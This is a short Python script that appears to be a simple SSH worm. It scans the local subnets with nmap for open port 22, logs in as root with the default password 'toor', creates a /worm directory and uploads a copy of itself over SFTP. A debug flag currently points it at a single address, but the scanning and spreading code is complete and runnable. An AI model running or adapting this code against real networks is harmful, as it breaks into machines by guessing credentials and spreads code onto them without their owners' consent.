#!/usr/bin/env python3
import os

import nmap
import paramiko
import psutil


###############
#### network
###############


def bin2dec(mask: str):
    return sum(bin(int(x)).count('1') for x in mask.split('.'))


# 'nmap -oX - -p 22 -sV 172.20.144.1/20'
def find_hosts(addr: str):
    print(f'=== scanning {addr} ===')
    nm = nmap.PortScanner()
    # nm.scan(hosts=addr, ports='21,22,23,80,3389')
    nm.scan(hosts=addr, ports='22')
    nm.command_line()
    print(nm.scanstats())
    for host in nm.all_hosts():
        status = nm[host]
        yield status['addresses']['ipv4'], status['tcp'][22]['state']
        print(status)


def get_addr_mask(addrs: dict):
    for interface in addrs:
        snicaddrs = [snicaddr for snicaddr in addrs[interface] if snicaddr.netmask is not None]
        for snicaddr in snicaddrs:
            yield f'{snicaddr.address}/{bin2dec(snicaddr.netmask)}'


###############
#### ssh
###############

def connect_remote(addr: str):
    cmd_to_execute = 'mkdir -p /worm'

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(addr, username='root', password='toor')
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmd_to_execute)
    ssh_stdout.channel.set_combine_stderr(True)

    output = ssh_stdout.readlines()
    print(f'=== res={output} ===')

    send_load(ssh)

    ssh.close()


def send_load(ssh: paramiko.SSHClient):
    path = os.path.dirname(os.path.realpath(__file__))
    sftp = ssh.open_sftp()
    print(f'=== sending to {path} ===')
    sftp.put(f'{path}/script.py', '/worm/script.py')
    print('=== load sent ===')
    sftp.close()


if __name__ == '__main__':
    DEBUG = True
    if not DEBUG:
        net_info = psutil.net_if_addrs()
        print(net_info)
        addrs = [addr for addr in list(get_addr_mask(net_info)) if int(addr.split('/')[1]) > 20]
        print(addrs)
        hosts = [list(find_hosts(addr)) for addr in addrs]
        hosts = [item for sublist in hosts for item in sublist]
    else:
        hosts = [("10.0.0.12", "open")]

    for host in hosts:
        print(f'==== testing {host} ====')
        if host[1] == 'open':
            connect_remote(host[0])
    print('==== done 8) ====')
